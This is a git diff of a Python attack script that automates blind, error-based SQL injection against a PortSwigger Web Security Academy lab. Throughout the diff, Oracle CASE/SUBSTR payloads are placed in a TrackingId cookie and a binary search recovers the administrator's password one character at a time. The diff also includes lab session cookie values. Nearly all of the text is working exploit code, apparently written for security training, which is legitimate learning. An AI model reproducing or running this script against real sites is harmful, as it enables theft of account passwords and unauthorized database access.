@@ -13,125 +13,56 @@ def get_password_with_boolean_based_SQLi():
         
     #Initialisation of variable
     indice = 1 #use to change the indice of the password 
-    liste = [] #list all the found character 
+    result = [] #list all the found character 
     success = True 
+    url = 'https://0a950065035822a080f5490b008500f1.web-security-academy.net/'
+
     while indice <= 20: #we assume that the password have 20 character
         if success: #initialisation of all variable used during the process
-            letter = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
+            liste = ['0','1','2','3','4','5','6','7','8','9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
             low_bound = 0
-            high_bound = 25
-            mid_point = 13
-            marquage = 'lettre'
+            high_bound = 36
+            mid_point = 18
             operator1 = '>'
             operator2 = '='
-            payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
-            payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
+            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
+            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
             success = False
-            bad_sql1 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-            bad_sql2 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter2} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-            cookies1 = {
-                    'TrackingId': f"0p0tSxdhZBEKxgOy{bad_sql1}",
-                    'session': 'kklpiTsrxMhuk2Q6bklo2dOSpsPe5eRO'
-                    }
-            cookies2 = {
-                    'TrackingId': f"0p0tSxdhZBEKxgOy{bad_sql2}",
-                    'session': 'kklpiTsrxMhuk2Q6bklo2dOSpsPe5eRO'
-                    }
-        
-              
-        url = 'https://0a0e0066039a90dc82fb1bcd00890007.web-security-academy.net/'
-        output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
-        output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
-        output_message(f"[++] Index number : {indice}")
-        status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
-       
-        print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
-        
-        """We will make a binary search craft specialy for this kind of attack"""
-        
         while low_bound <= high_bound:
-            try:
-                high_bound,low_bound,mid_point = binary_search_coderr(status_code, operator1, high_bound, low_bound, mid_point)
-                
-                """The result_control will say if the payload parameter is correct, if it's the case, we change the index"""
-                
-                if status_code2 != 200:
-                    success = True
-                    successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
-                    indice +=1
-                    match marquage:#the purpose here is to print correctly the working 
-                        case "chiffre":
-                            liste.append(str(mid_point))
-                        case "lettre":
-                            liste.append(str(letter[mid_point]))
-                    break
-            except Exception as e:
-                print(f"error during binary search {e}")
-             
-            """We change the binary_average in order to search the best parameter"""
-                    
-            mid_point = (low_bound+high_bound)//2
-            match marquage:
-                case 'chiffre':
-                    payload_parameter1 = f"{operator1}'{mid_point}'"
-                    payload_parameter2 = f"{operator2}'{mid_point}'"
-                case 'lettre':
-                    payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
-                    payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
-                    
-            """We send a packet with the new craft payload and see if it work"""
-            
             bad_sql1 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
             bad_sql2 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter2} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
             cookies1 = {
-                    'TrackingId': f"0p0tSxdhZBEKxgOy{bad_sql1}",
-                    'session': 'kklpiTsrxMhuk2Q6bklo2dOSpsPe5eRO'
+                    'TrackingId': f"FjnUhyE6zvbng0Yo{bad_sql1}",
+                    'session': 'WEHBusCNkrJ8JPZdc7RSW3sFD4iSebxr'
                     }
             cookies2 = {
-                    'TrackingId': f"0p0tSxdhZBEKxgOy{bad_sql2}",
-                    'session': 'kklpiTsrxMhuk2Q6bklo2dOSpsPe5eRO'
-                    }   
-            
+                    'TrackingId': f"FjnUhyE6zvbng0Yo{bad_sql2}",
+                    'session': 'WEHBusCNkrJ8JPZdc7RSW3sFD4iSebxr'
+                    }
             output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
             output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
             output_message(f"[++] Index number : {indice}")
-            status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
+            status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
             print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
-
-            ###########pb commence là###########""
+            
             if status_code2 != 200:
                 success = True
-                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
+                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!!")
+                result.append(liste[mid_point])
+                print(Fore.YELLOW + f"Payload result... {''.join(result)}\n\n" + Style.RESET_ALL)                
                 indice +=1
-                
-                """Here we match the marquage to the good term in order to print the correct parameter to the user"""
-                
-                match marquage:
-                    case "chiffre":
-                        liste.append(str(mid_point))
-                    case "lettre":
-                        liste.append(str(letter[mid_point]))
                 break
             
-        """Here the part where we change letters to numbers"""
-           ########PB ICI##############""
-        if low_bound > high_bound:  
-            low_bound, high_bound = 0, 10 
+            high_bound,low_bound,mid_point = binary_search_coderr(status_code, operator1, high_bound, low_bound, mid_point)     
             mid_point = (low_bound+high_bound)//2
-            marquage = 'chiffre'
-            print(Fore.MAGENTA + "Move on to the numbers test.\n" + Style.RESET_ALL)
-            success = False
-            payload_parameter1 = f"{operator1}'{mid_point}'"
-            payload_parameter2 = f"{operator2}'{mid_point}'"
-        
-        #in case if the letters and the numbers don't work, we stop the programm. 
+            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
+            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
                         
-        elif low_bound > high_bound and marquage == 'chiffre':
+        if low_bound > high_bound :
             warning_message("All tests failed :( ")
             break
             
-        print(Fore.YELLOW + f"Payload result... {''.join(liste)}\n\n" + Style.RESET_ALL)
         
         
 if __name__=='__main__':
